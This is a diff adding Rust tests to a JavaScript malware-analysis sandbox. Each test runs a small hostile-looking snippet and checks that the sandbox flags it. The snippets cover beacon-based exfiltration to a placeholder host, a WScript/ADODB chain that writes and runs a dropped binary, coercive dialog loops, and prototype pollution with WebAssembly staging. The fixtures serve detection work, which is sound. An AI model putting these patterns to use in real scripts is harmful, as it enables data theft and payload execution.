@@ -1,4 +1,4 @@
-use js_analysis::{DynamicOptions, DynamicOutcome, RuntimePhase};
+use js_analysis::{DynamicOptions, DynamicOutcome, RuntimeKind, RuntimeMode, RuntimePhase};
 
 #[cfg(feature = "js-sandbox")]
 #[test]
@@ -1592,6 +1592,125 @@ fn sandbox_flags_modern_fingerprint_evasion() {
                 .behavioral_patterns
                 .iter()
                 .any(|pattern| pattern.name == "modern_fingerprint_evasion"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_chunked_data_exfil_pipeline() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var parts = [];
+        parts.push('AA');
+        parts.push('BB');
+        var packed = btoa(parts.join(''));
+        navigator.sendBeacon('https://example.invalid/a', packed);
+        navigator.sendBeacon('https://example.invalid/b', packed);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "chunked_data_exfil_pipeline"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_interaction_coercion_loop() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        alert('Enable content to continue');
+        confirm('Please allow now');
+        prompt('Retry to continue');
+        setTimeout(function () {}, 1);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "interaction_coercion_loop"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_lotl_api_chain_execution() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var shell = WScript.CreateObject('WScript.Shell');
+        shell.ExpandEnvironmentStrings('%TEMP%');
+        var stream = WScript.CreateObject('ADODB.Stream');
+        stream.Open();
+        stream.Write('MZ');
+        stream.SaveToFile('C:\\Temp\\x.bin', 2);
+        shell.Run('C:\\Temp\\x.bin', 0, false);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "lotl_api_chain_execution"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_expands_prototype_and_wasm_signals_in_browser_profile() {
+    let mut browser_options = DynamicOptions::default();
+    browser_options.runtime_profile.kind = RuntimeKind::Browser;
+    browser_options.runtime_profile.mode = RuntimeMode::DeceptionHardened;
+
+    let mut pdf_options = DynamicOptions::default();
+    pdf_options.runtime_profile.kind = RuntimeKind::PdfReader;
+    pdf_options.runtime_profile.mode = RuntimeMode::Compat;
+
+    let payload = br#"
+        eval("Object.prototype._x='1';var o={};o.__proto__._y=2;");
+        WebAssembly.instantiate('mod');
+        WebAssembly.Table({initial:1, element:'anyfunc'});
+        eval('1');
+    "#;
+
+    let browser = js_analysis::run_sandbox(payload, &browser_options);
+    let pdf = js_analysis::run_sandbox(payload, &pdf_options);
+    match (browser, pdf) {
+        (DynamicOutcome::Executed(browser_signals), DynamicOutcome::Executed(pdf_signals)) => {
+            let browser_proto = browser_signals
+                .behavioral_patterns
+                .iter()
+                .find(|pattern| pattern.name == "prototype_chain_execution_hijack")
+                .expect("browser prototype pattern");
+            let browser_wasm = browser_signals
+                .behavioral_patterns
+                .iter()
+                .find(|pattern| pattern.name == "wasm_loader_staging")
+                .expect("browser wasm pattern");
+            let pdf_wasm = pdf_signals
+                .behavioral_patterns
+                .iter()
+                .find(|pattern| pattern.name == "wasm_loader_staging")
+                .expect("pdf wasm pattern");
+            assert!(browser_proto
+                .metadata
+                .get("expanded_profile")
+                .map(|value| value == "true")
+                .unwrap_or(false));
+            assert!(browser_wasm.confidence >= pdf_wasm.confidence);
         }
         _ => panic!("expected executed"),
     }
